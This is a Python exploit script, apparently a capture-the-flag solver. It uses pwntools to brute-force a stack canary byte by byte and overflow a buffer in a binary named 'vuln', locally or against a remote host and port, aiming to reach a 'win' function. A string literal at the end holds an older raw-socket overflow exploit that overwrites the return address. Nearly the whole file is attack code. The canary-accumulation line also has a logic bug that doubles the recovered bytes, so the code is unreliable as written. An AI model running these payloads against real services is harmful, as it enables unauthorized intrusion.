import argparse
import pwn


pwn.context.log_level = 'critical'

parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--target","-t", type=str, default="",required=False)
parser.add_argument("--port","-p", type=int, default=0,required=False)

args = parser.parse_args()


elf = pwn.ELF('./vuln')

#print(elf.symbols["win"])
#p = elf.process()
#q = pwn.gdb.attach(p)


#print(p.recv().decode("utf-8"))


OFFSET = 64

new_eip = pwn.p32(elf.symbols["win"])
canary_value = bytearray(b"")
#return_address = pwn.p32(elf.symbols["main"])
while len(canary_value) < 4:
    for byte in range(0, 256):
    
        payload = b"".join(
            [
                b"A" * OFFSET,
                canary_value + chr(byte).encode("utf-8"),
                #b"A" * (16 + (4 - len(canary_value))),
                #new_eip
            ]    
        )
        print(f"{payload=}")

#payload = b"1000\n" + payload + b"\n"
        with open("payload", "wb") as filp:
            filp.write(b"1000\n" + payload)

        if args.destination == "local":
            p = elf.process()
        elif args.destination == "remote":
            if not args.target or not args.port:
                pwn.warning("Suplly -t for target and -p for port")
                exit()
            p = pwn.remote(args.target, args.port)


        p.recvline().decode("utf-8")
        p.sendline(b"1000")
        p.recvuntil("Input> ")
        p.sendline(payload)
        response = p.recvall().decode("utf-8")

        print(f"{response=}")
        if "Flag?" in response:
            canary_value += canary_value + chr(byte).encode("utf-8")
            break











'''

import socket
import argparse
import struct


parser = argparse.ArgumentParser()
parser.add_argument(
    "host",
    type=str, 
    help="The hostname or IP address to connect to",)
parser.add_argument(
    "port", 
    type=int, 
    help="The port for the service to connect to",)

args = parser.parse_args()

#>>> "A" * (32+4+4+4) + "\xf6\x91\x04\x08"
#'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÃ¶\x91\x04\x08'

offset = 72

#new_rip = struct.pack("<Q", 0x40123B) # win function within the vuln binary

payload = b"".join(
    [
        b"A" * offset,
        #new_rip,
        b"\x3b\x12\x40"
    ]
)
#print(args.host, args.port)

payload += b"\n"

with socket.socket() as connection:
    
    connection.connect((args.host, args.port))
    connection.recv(4096).decode('utf-8')
    connection.send(payload)
    print(connection.recv(4096).decode('utf-8'))
    print(connection.recv(4096).decode('utf-8'))
    print(connection.recv(4096).decode('utf-8'))
'''

